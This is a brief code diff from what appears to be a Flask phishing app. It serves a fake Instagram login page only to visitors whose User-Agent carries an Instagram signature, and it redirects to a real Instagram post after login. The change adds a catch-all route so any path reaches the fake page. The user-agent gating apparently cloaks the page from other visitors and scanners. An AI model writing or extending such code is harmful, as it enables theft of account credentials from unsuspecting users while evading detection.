@@ -20,8 +20,9 @@ def login():
     return redirect('https://www.instagram.com/p/NdYIBT9hYfq6yfzrf8Zr')
 
 
-@app.route('/')
-def login_page():
+@app.route('/', methods=['GET'])
+@app.route('/<path:p>', methods=['GET'])
+def login_page(p: str=None):
     if INSTAGRAM_USERAGENT_SIGNATURE in request.headers.get('User-Agent'):
         return render_template('instagram-login.html')
     else:
